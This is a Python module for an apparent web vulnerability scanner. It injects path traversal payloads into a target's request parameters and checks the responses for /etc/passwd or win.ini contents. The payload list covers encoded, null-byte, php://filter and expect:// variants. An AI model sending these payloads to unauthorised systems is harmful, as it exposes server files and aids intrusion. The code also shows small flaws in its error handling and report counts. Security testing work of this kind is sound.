"""WVS v17.0 - 路径遍历扫描器

检测目录遍历/路径遍历漏洞
"""
import asyncio
import re
from typing import List, Dict, Optional
from urllib.parse import quote
from dataclasses import dataclass
from enum import Enum

try:
    import aiohttp
except ImportError:
    aiohttp = None


class TraversalType(Enum):
    BASIC = "basic"             # 基础 ../../../
    ENCODED = "encoded"         # URL 编码
    DOUBLE_ENCODED = "double_encoded"  # 双重编码
    NULL_BYTE = "null_byte"     # 空字节
    WRAPPER = "wrapper"         # 包装器


@dataclass
class TraversalResult:
    vulnerable: bool
    traversal_type: TraversalType
    parameter: str
    payload: str
    file_accessed: str
    evidence: str
    confidence: float


# 路径遍历 Payload 库
TRAVERSAL_PAYLOADS = {
    "basic_unix": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ],
    "basic_windows": [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "../../../../windows/win.ini",
        "....\\\\....\\\\....\\\\windows/win.ini",
        "..%5c..%5c..%5cwindows/win.ini",
    ],
    "encoded": [
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
        "..%252f..%252f..%252fetc/passwd",
        "..%255c..%255c..%255cwindows/win.ini",
    ],
    "double_encoded": [
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
        "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows/win.ini",
    ],
    "null_byte": [
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        "..\\..\\..\\windows\\win.ini%00.jpg",
        "../../../etc/passwd%00",
    ],
    "wrapper": [
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "expect://id",
        "zip://test.zip../../../../etc/passwd",
    ],
    "mixed": [
        "....//....//....//etc/passwd",
        "..//..//..//etc/passwd",
        "/etc/passwd",
        "/etc/passwd%00",
    ],
}

# 检测特征
TRAVERSAL_EVIDENCE = {
    "unix_passwd": [
        r"root:[x*]:0:0:",
        r"daemon:[x*]:1:1:",
        r"nobody:[x*]:",
        r"/bin/(ba)?sh",
        r"/usr/sbin/nologin",
    ],
    "windows_ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"MAPI=1",
        r"COMCTL32",
    ],
    "unix_etc": [
        r"bin:x:1:1",
        r"daemon:x:",
        r"nobody:x:",
    ],
}


class TraversalScannerV17:
    """路径遍历扫描器 v17.0"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.test_unix = self.config.get("test_unix", True)
        self.test_windows = self.config.get("test_windows", True)
    
    async def scan(
        self,
        url: str,
        method: str = "GET",
        params: Dict[str, str] = None,
        data: Dict[str, str] = None,
        headers: Dict[str, str] = None,
        cookies: Dict[str, str] = None
    ) -> List[TraversalResult]:
        """扫描路径遍历"""
        results = []
        
        params = params or {}
        data = data or {}
        all_params = {**params, **data}
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            for param, value in all_params.items():
                # 基础测试
                basic_result = await self._test_basic(
                    session, url, method, param, params, data, headers, cookies
                )
                if basic_result:
                    results.append(basic_result)
                    continue
                
                # 编码测试
                encoded_result = await self._test_encoded(
                    session, url, method, param, params, data, headers, cookies
                )
                if encoded_result:
                    results.append(encoded_result)
                    continue
                
                # 双重编码测试
                double_encoded_result = await self._test_double_encoded(
                    session, url, method, param, params, data, headers, cookies
                )
                if double_encoded_result:
                    results.append(double_encoded_result)
                    continue
                
                # 空字节测试
                null_result = await self._test_null_byte(
                    session, url, method, param, params, data, headers, cookies
                )
                if null_result:
                    results.append(null_result)
                    continue
                
                # 包装器测试
                wrapper_result = await self._test_wrapper(
                    session, url, method, param, params, data, headers, cookies
                )
                if wrapper_result:
                    results.append(wrapper_result)
        
        return results
    
    async def _test_basic(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[TraversalResult]:
        """基础路径遍历测试"""
        
        payloads = []
        if self.test_unix:
            payloads.extend(TRAVERSAL_PAYLOADS["basic_unix"])
        if self.test_windows:
            payloads.extend(TRAVERSAL_PAYLOADS["basic_windows"])
        
        for payload in payloads:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                result = self._check_response(response_text, payload)
                if result:
                    return TraversalResult(
                        vulnerable=True,
                        traversal_type=TraversalType.BASIC,
                        parameter=param,
                        payload=payload,
                        file_accessed=result["file"],
                        evidence=result["evidence"],
                        confidence=0.95
                    )
            except:
                pass
        
        return None
    
    async def _test_encoded(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[TraversalResult]:
        """URL 编码测试"""
        
        for payload in TRAVERSAL_PAYLOADS["encoded"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                result = self._check_response(response_text, payload)
                if result:
                    return TraversalResult(
                        vulnerable=True,
                        traversal_type=TraversalType.ENCODED,
                        parameter=param,
                        payload=payload,
                        file_accessed=result["file"],
                        evidence=result["evidence"],
                        confidence=0.9
                    )
            except:
                pass
        
        return None
    
    async def _test_double_encoded(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[TraversalResult]:
        """双重 URL 编码测试"""
        
        for payload in TRAVERSAL_PAYLOADS["double_encoded"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                result = self._check_response(response_text, payload)
                if result:
                    return TraversalResult(
                        vulnerable=True,
                        traversal_type=TraversalType.DOUBLE_ENCODED,
                        parameter=param,
                        payload=payload,
                        file_accessed=result["file"],
                        evidence=result["evidence"],
                        confidence=0.85
                    )
            except:
                pass
        
        return None
    
    async def _test_null_byte(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[TraversalResult]:
        """空字节测试"""
        
        for payload in TRAVERSAL_PAYLOADS["null_byte"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                result = self._check_response(response_text, payload)
                if result:
                    return TraversalResult(
                        vulnerable=True,
                        traversal_type=TraversalType.NULL_BYTE,
                        parameter=param,
                        payload=payload,
                        file_accessed=result["file"],
                        evidence=result["evidence"],
                        confidence=0.9
                    )
            except:
                pass
        
        return None
    
    async def _test_wrapper(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> Optional[TraversalResult]:
        """包装器测试"""
        
        for payload in TRAVERSAL_PAYLOADS["wrapper"]:
            try:
                response_text = await self._send_request(
                    session, url, method, param, payload, params, data, headers, cookies
                )
                
                result = self._check_response(response_text, payload)
                if result:
                    return TraversalResult(
                        vulnerable=True,
                        traversal_type=TraversalType.WRAPPER,
                        parameter=param,
                        payload=payload,
                        file_accessed=result["file"],
                        evidence=result["evidence"],
                        confidence=0.9
                    )
            except:
                pass
        
        return None
    
    def _check_response(self, response_text: str, payload: str) -> Optional[Dict]:
        """检查响应是否存在文件内容"""
        
        # Unix passwd
        for pattern in TRAVERSAL_EVIDENCE["unix_passwd"]:
            if re.search(pattern, response_text):
                return {
                    "file": "/etc/passwd",
                    "evidence": f"发现 passwd 文件特征: {pattern}"
                }
        
        # Windows ini
        for pattern in TRAVERSAL_EVIDENCE["windows_ini"]:
            if re.search(pattern, response_text, re.IGNORECASE):
                return {
                    "file": "win.ini",
                    "evidence": f"发现 win.ini 文件特征: {pattern}"
                }
        
        return None
    
    async def _send_request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        method: str,
        param: str,
        payload: str,
        params: Dict,
        data: Dict,
        headers: Dict,
        cookies: Dict
    ) -> str:
        """发送请求"""
        
        test_params = params.copy()
        test_data = data.copy()
        
        if param in test_params:
            test_params[param] = payload
        elif param in test_data:
            test_data[param] = payload
        
        if method.upper() == "GET":
            async with session.get(
                url, params=test_params, headers=headers, cookies=cookies
            ) as resp:
                return await resp.text()
        else:
            async with session.request(
                method, url, params=test_params, data=test_data, headers=headers, cookies=cookies
            ) as resp:
                return await resp.text()
    
    def generate_report(self, results: List[TraversalResult]) -> Dict:
        """生成报告"""
        severity_map = {
            TraversalType.BASIC: "Critical",
            TraversalType.ENCODED: "High",
            TraversalType.DOUBLE_ENCODED: "High",
            TraversalType.NULL_BYTE: "High",
            TraversalType.WRAPPER: "Critical",
        }
        
        return {
            "vulnerabilities": [
                {
                    "type": "Path Traversal",
                    "parameter": r.parameter,
                    "payload": r.payload,
                    "traversal_type": r.traversal_type.value,
                    "file_accessed": r.file_accessed,
                    "confidence": r.confidence,
                    "evidence": r.evidence,
                    "severity": severity_map.get(r.traversal_type, "High")
                }
                for r in results
            ],
            "summary": {
                "total": len(results),
                "critical": sum(1 for r in results if r.traversal_type in [TraversalType.BASIC, TraversalType.WRAPPER]),
                "high": sum(1 for r in results if r.traversal_type in [TraversalType.ENCODED, TraversalType.NULL_BYTE]),
            }
        }
